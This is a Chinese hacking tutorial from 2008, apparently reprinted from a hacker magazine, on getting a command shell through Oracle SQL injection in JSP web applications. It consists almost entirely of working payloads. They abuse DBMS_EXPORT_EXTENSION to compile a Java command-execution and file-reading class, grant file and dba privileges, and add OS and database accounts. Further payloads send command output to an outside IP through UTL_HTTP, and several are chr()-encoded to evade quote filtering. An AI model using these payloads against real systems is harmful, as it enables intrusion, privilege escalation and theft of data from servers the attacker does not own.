@@ -1,0 +1,349 @@
+ 犀利的 oracle 注入技术
+原文发表在黑客手册
+
+linx 2008.1.12
+
+介绍一个在web上通过oracle注入直接取得主机cmdshell的方法。
+
+以下的演示都是在web上的sql plus执行的，在web注入时 把select SYS.DBMS_EXPORT_EXTENSION.....改成
+
+/xxx.jsp?id=1 and '1'<>'a'||(select SYS.DBMS_EXPORT_EXTENSION.....)
+
+的形式即可。(用" 'a'|| "是为了让语句返回true值)
+
+语句有点长，可能要用post提交。
+
+
+
+以下是各个步骤：
+
+1.创建包
+通过注入 SYS.DBMS_EXPORT_EXTENSION 函数，在oracle上创建Java包LinxUtil，里面两个函数，runCMD用于执行系统命令，readFile用于读取文件：
+
+/xxx.jsp?id=1 and '1'<>'a'||(
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(
+new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}
+}'''';END;'';END;--','SYS',0,'1',0) from dual
+
+)
+
+------------------------
+如果url有长度限制，可以把readFile()函数块去掉，即：
+/xxx.jsp?id=1 and '1'<>'a'||(
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(
+new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}
+}'''';END;'';END;--','SYS',0,'1',0) from dual
+
+)
+
+同时把后面步骤 提到的 对readFile()的处理语句去掉。
+------------------------------
+
+2.赋Java权限
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual
+
+
+
+3.创建函数
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''''''LinxUtil.runCMD(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+create or replace function LinxReadFile(filename in varchar2) return varchar2 as language java name ''''''''LinxUtil.readFile(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual
+
+4.赋public执行函数的权限
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxReadFile to public'''';END;'';END;--','SYS',0,'1',0) from dual
+
+
+
+5.测试上面的几步是否成功
+
+and '1'<>'11'||(
+select OBJECT_ID from all_objects where object_name ='LINXRUNCMD'
+)
+
+and '1'<>(
+select OBJECT_ID from all_objects where object_name ='LINXREADFILE'
+)
+
+6.执行命令：
+
+/xxx.jsp?id=1 and '1'<>(
+select sys.LinxRunCMD('cmd /c net user linx /add') from dual
+)
+
+/xxx.jsp?id=1 and '1'<>(
+select sys.LinxReadFile('c:/boot.ini') from dual
+)
+
+注意sys.LinxReadFile()返回的是varchar类型，不能用"and 1<>" 代替 "and '1'<>"。
+如果要查看运行结果可以用 union :
+
+/xxx.jsp?id=1 union select sys.LinxRunCMD('cmd /c net user linx /add') from dual
+
+或者UTL_HTTP.request(:
+
+/xxx.jsp?id=1 and '1'<>(
+SELECT UTL_HTTP.request('http://211.71.147.3/record.php?a=LinxRunCMD:&#39;||REPLACE(REPLACE(sys.LinxRunCMD('cmd /c net user aaa /del'),' ','%20'),'\n','%0A')) FROM dual
+)
+
+/xxx.jsp?id=1 and '1'<>(
+SELECT UTL_HTTP.request('http://211.71.147.3/record.php?a=LinxRunCMD:&#39;||REPLACE(REPLACE(sys.LinxReadFile('c:/boot.ini'),' ','%20'),'\n','%0A')) FROM dual
+)
+
+注意：用UTL_HTTP.request时，要用 REPLACE() 把空格、换行符给替换掉，否则会无法提交http request。用utl_encode.base64_encode也可以。
+
+
+
+
+
+--------------------
+
+6.内部变化
+通过以下命令可以查看all_objects表达改变：
+select * from all_objects where object_name like '%LINX%' or object_name like '%Linx%'
+
+7.删除我们创建的函数
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+drop function LinxRunCMD '''';END;'';END;--','SYS',0,'1',0) from dual
+
+
+
+
+
+====================================================
+全文结束。谨以此文赠与我的朋友。
+
+linx
+124829445
+2008.1.12
+linyujian@bjfu.edu.cn
+
+
+
+
+
+======================================================================
+
+测试漏洞的另一方法：
+
+创建oracle帐号：
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+CREATE USER linxsql IDENTIFIED BY linxsql'''';END;'';END;--','SYS',0,'1',0) from dual
+
+即：
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(67)||chr(82)||chr(69)||chr(65)||chr(84)||chr(69)||chr(32)||chr(85)||chr(83)||chr(69)||chr(82)||chr(32)||chr(108)||chr(105)||chr(110)||chr(120)||chr(115)||chr(113)||chr(108)||chr(32)||chr(73)||chr(68)||chr(69)||chr(78)||chr(84)||chr(73)||chr(70)||chr(73)||chr(69)||chr(68)||chr(32)||chr(66)||chr(89)||chr(32)||chr(108)||chr(105)||chr(110)||chr(120)||chr(115)||chr(113)||chr(108)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+
+确定漏洞存在：
+1<>(
+select user_id from all_users where username='LINXSQL'
+)
+
+给linxsql连接权限：
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+GRANT CONNECT TO linxsql'''';END;'';END;--','SYS',0,'1',0) from dual
+
+删除帐号：
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+drop user LINXSQL'''';END;'';END;--','SYS',0,'1',0) from dual
+
+======================
+
+以下方法创建一个可以执行多语句的函数Linx_query()，执行成功的话返回数值"1"，但权限是继承的，可能仅仅是public权限，作用似乎不大，真的要用到话可以考虑grant dba to 当前的User：
+
+1.jsp?id=1 and '1'<>(
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+create or replace function Linx_query (p varchar2) return number authid current_user is begin execute immediate p; return 1; end; '''';END;'';END;--','SYS',0,'1',0) from dual
+) and ...
+
+1.jsp?id=1 and '1'<>(
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on Linx_query to public'''';END;'';END;--','SYS',0,'1',0) from dual
+) and ...
+
+1.jsp?id=1 and '1'<>(
+SELECT sys.Linx_Query('SELECT 14554 FROM DUAL') FROM DUAL
+) and ...
+
+
+
+1.jsp?id=1 and '1'<>(
+SELECT sys.Linx_Query('declare pragma
+autonomous_transaction; begin execute immediate ''
+select 1 from dual
+''; commit; end;') from dual
+) and ...
+
+多语句：
+SELECT sys.Linx_Query('declare temp varchar2(200); begin select 1 into temp from dual; select 2 into temp from dual; end;') from dual
+
+创建用户(除非当前用户有system权限，否则无法成功)：
+SELECT sys.Linx_Query('declare pragma
+autonomous_transaction; begin execute immediate ''
+CREATE USER Linx_Query_User IDENTIFIED BY Linx_Query_User
+''; commit; end;') from dual
+
+
+
+
+
+================
+以下的方法是先建立函数Linx_Query(),再建立 RunCMD2()
+
+1.创建函数
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+create or replace function Linx_Query (p
+varchar2) return number authid current_user is begin execute immediate
+p; return 1; end; '''';END;'';END;--','SYS',0,'1',0) from dual;
+
+如果有权限，以下语句应该允许正常
+select sys.linx_query('select 1 from dual') from dual;
+
+不然的话运行：
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+grant dba to 当前的User'''';END;'';END;--','SYS',0,'1',0) from dual
+
+
+
+2.创建包
+SELECT sys.Linx_Query('declare pragma
+autonomous_transaction; begin execute immediate ''
+create or replace and compile java source named "LinxUtil2" as import java.io.*;public class LinxUtil2 extends Object {public static String RunCMD(String args) throws IOException{BufferedReader myReader= new BufferedReader(
+new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";return str;}}''; commit; end;') from dual
+
+3.创建函数
+SELECT sys.Linx_Query('declare pragma
+autonomous_transaction; begin execute immediate ''
+create or replace function RunCMD2(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil2.RunCMD(java.lang.String) return String'''';''; commit; end;') from dual
+
+4.给权限
+给用户SYSTEM执行权限：
+
+SELECT sys.Linx_Query('declare pragma autonomous_transaction;begin dbms_java.grant_permission( ''SYSTEM'', ''SYS:java.io.FilePermission'', ''<<ALL FILES>>'', ''execute'' );end;') from dual
+
+
+
+5.执行函数
+select RunCMD2('cmd /c dir') from dual
+
+
+
+
+
+==================
+================================
+
+以下是无 " ' " 版：
+
+以下是各个步骤：
+
+1.创建包
+通过注入 SYS.DBMS_EXPORT_EXTENSION 函数，在oracle上创建Java包LinxUtil，里面两个函数，runCMD用于执行系统命令，readFile用于读取文件：
+因为建立了两个函数，转换为ascii后，语句更长了，注意提交时不要把换行去掉，否则执行不成功的：
+
+/xxx.jsp?id=1 and chr(49)<>chr(50)||(
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
+chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||
+chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(97)||chr(110)||chr(100)||chr(32)||chr(99)||chr(111)||chr(109)||chr(112)||chr(105)||chr(108)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(115)||chr(111)||chr(117)||chr(114)||chr(99)||chr(101)||chr(32)||chr(110)||
+chr(97)||chr(109)||chr(101)||chr(100)||chr(32)||chr(34)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(34)||chr(32)||chr(97)||chr(115)||chr(32)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||
+chr(46)||chr(105)||chr(111)||chr(46)||chr(42)||chr(59)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(99)||chr(108)||chr(97)||chr(115)||chr(115)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(32)||chr(101)||
+chr(120)||chr(116)||chr(101)||chr(110)||chr(100)||chr(115)||chr(32)||chr(79)||chr(98)||chr(106)||chr(101)||chr(99)||chr(116)||chr(32)||chr(123)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||
+chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(32)||chr(123)||chr(116)||chr(114)||chr(121)||
+chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||
+chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||
+chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(32)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(46)||chr(103)||chr(101)||chr(116)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(40)||chr(41)||chr(46)||chr(101)||
+chr(120)||chr(101)||chr(99)||chr(40)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(46)||chr(103)||chr(101)||chr(116)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(40)||chr(41)||chr(32)||chr(41)||chr(32)||chr(41)||
+chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||
+chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||
+chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||
+chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||
+chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||
+chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(101)||
+chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||
+chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||
+chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(70)||chr(105)||chr(108)||chr(101)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||
+chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(41)||chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||
+chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||
+chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||
+chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||
+chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||
+chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(125)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45)
+,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+
+)
+
+------------------------------
+
+2.赋Java权限
+/xxx.jsp?id=1 and chr(49)<>chr(50)||(
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
+chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(98)||chr(101)||chr(103)||chr(105)||chr(110)||chr(32)||chr(100)||chr(98)||chr(109)||chr(115)||chr(95)||chr(106)||chr(97)||chr(118)||chr(97)||
+chr(46)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(95)||chr(112)||chr(101)||chr(114)||chr(109)||chr(105)||chr(115)||chr(115)||chr(105)||chr(111)||chr(110)||chr(40)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(80)||chr(85)||chr(66)||chr(76)||chr(73)||chr(67)||chr(39)||
+chr(39)||chr(39)||chr(39)||chr(44)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(83)||chr(89)||chr(83)||chr(58)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(105)||chr(111)||chr(46)||chr(70)||chr(105)||chr(108)||chr(101)||chr(80)||chr(101)||chr(114)||chr(109)||chr(105)||
+chr(115)||chr(115)||chr(105)||chr(111)||chr(110)||chr(39)||chr(39)||chr(39)||chr(39)||chr(44)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(60)||chr(60)||chr(65)||chr(76)||chr(76)||chr(32)||chr(70)||chr(73)||chr(76)||chr(69)||chr(83)||chr(62)||chr(62)||chr(39)||chr(39)||
+chr(39)||chr(39)||chr(44)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(101)||chr(120)||chr(101)||chr(99)||chr(117)||chr(116)||chr(101)||chr(39)||chr(39)||chr(39)||chr(39)||chr(41)||chr(59)||chr(101)||chr(110)||chr(100)||chr(59)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||
+chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45)
+,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+
+)
+
+readfile函数的ascii版就不写了，见谅。
+
+3.创建函数
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
